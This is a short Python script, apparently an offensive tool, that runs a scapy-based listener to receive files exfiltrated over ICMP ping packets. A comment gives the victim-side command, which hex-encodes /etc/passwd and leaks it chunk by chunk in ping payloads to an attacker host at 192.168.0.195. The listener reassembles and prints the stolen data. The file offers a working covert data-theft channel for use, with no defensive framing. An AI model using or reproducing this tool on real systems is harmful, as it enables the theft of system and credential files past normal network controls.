#!/usr/bin/env python3

# This is a server for files ICMP exfiltration
# On victim machine you should type something like that:
# xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line 192.168.0.195 > /dev/null; done

from scapy.all import *
import sys

if len(sys.argv) != 2:
    print("Usage: icmp_exfiltration.py <interface>")
    raise SystemExit

def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            print(f"{pkt[ICMP].load[-4:].decode('utf-8')}", end='', flush=True)

sniff(iface=sys.argv[1], prn=process_packet)
